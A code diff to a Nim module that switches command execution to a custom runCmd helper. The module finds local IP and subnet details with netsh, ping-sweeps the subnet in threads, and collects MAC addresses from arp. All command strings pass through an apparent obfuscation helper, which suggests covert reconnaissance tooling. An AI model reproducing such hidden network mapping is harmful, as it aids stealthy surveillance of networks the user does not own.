@@ -4,7 +4,7 @@ from strutils import parseUInt
 from strutils import unIndent
 from strutils import splitWhitespace
 
-from osproc import execProcess
+import ../functions/runCmd
 
 from math import ceil
 
@@ -18,10 +18,10 @@ import ../functions/hideString
 proc getIPAndSubnetMask(): tuple[worked: bool, ip: string, subnetMask: string] =
   result.worked = true
 
-  var netsh: string = execProcess d e "netsh interface ip show addresses \"Wi-Fi\""
+  var netsh: string = runCmd d e "netsh interface ip show addresses \"Wi-Fi\""
 
   if netsh.contains d e"incorrect.":
-    netsh = execProcess d e "netsh interface ip show addresses \"Ethernet\""
+    netsh = runCmd d e "netsh interface ip show addresses \"Ethernet\""
 
   let subnetPrefix: string = d e "Subnet Prefix"
 
@@ -46,7 +46,7 @@ proc generateIPsForPing(start1, stop1, start2, stop2: uint8): seq[string] =
 
 proc pingIPs(ips: seq[string]): void {.thread.} =
   for ip in ips:
-    let ping: string = execProcess d(e("ping -n 1 ")) & ip
+    let ping: string = runCmd d(e("ping -n 1 ")) & ip
 
     if ping.contains d e"Approximate round":
       connectedDevicesThreadChannel.send ip
@@ -69,7 +69,7 @@ proc assignIPSToThread(ips: seq[string]): seq[seq[string]] =
       result[thread].add val
 
 proc getMACSFromIPS(ips: seq[string]): void =
-  let arp: string = execProcess d e"arp -a"
+  let arp: string = runCmd d e"arp -a"
 
   for line in arp.split d e "\n":
     if line.contains d e"dynamic":
